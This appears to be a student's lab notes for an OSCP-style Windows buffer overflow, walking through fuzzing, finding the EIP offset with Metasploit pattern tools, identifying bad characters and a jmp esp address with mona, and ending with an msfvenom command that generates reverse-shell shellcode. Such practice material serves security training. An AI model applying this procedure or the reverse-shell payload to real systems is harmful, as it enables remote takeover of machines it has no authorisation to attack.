Run 1_fuzzer.py

Note down Crashing bytes number

Run /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <crashing bytes number>


Edit 2_controlEIP.py and change payload to string genereated by pattern_create

Note EIP address and run /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP address>



Edit 3_offset.py with offset and set payload to string generated by pattern_create. 

Run 3_offset.py. EIP should be 42424242



Edit 4_badChars.py as needed with offset
 
Run 4_badChars.py and note down ESP address

Example:
ESP address: 018CFA30


In immunity, run !mona bytearray -b "\x00". File should be in C:\Program Files\Immunity Inc\Immunity Debugger. Make C:\mona directory and copy bytearray.bin file into there


Run !mona compare -f C:\mona\bytearray.bin -a <ESP address>

Bad chars after every other one

Example: 
\x00\x07\x08\x2e\x2f\xa0\xa1


Bad chars are \x00\x07\x2e\xa0. \x00 is always bad char



Run !mona modules to find jump point. Look for all falses

Run !mona find -s "\xff\xe4" -m <module name with all falses>

Note down address


----------------------
Finding Jump Point
----------------------

With the oscp.exe either running or in a crashed state, run the following mona command, making sure to update the -cpb option with all the badchars you identified (including \x00):

!mona jmp -r esp -cpb "badChars"

This command finds all "jmp esp" (or equivalent) instructions with addresses that don't contain any of the badchars specified. The results should display in the "Log data" window (use the Window menu to switch to it if needed).

Choose an address and update your exploit.py script, setting the "retn" variable to the address, written backwards (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.

Jump point address
Ex: 625011AF = \xAF\x11\x50\x62

56 52 66 83 = \x83\x66\x52\x56



----------------------

Use msfvenom to generate shell code

msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 EXITFUNC=thread -b "\x00\x16\x2f\xf4\xfd (badChars)" -f c


Edit 5_shell.py with all the gathered info. 

retn = jump point address
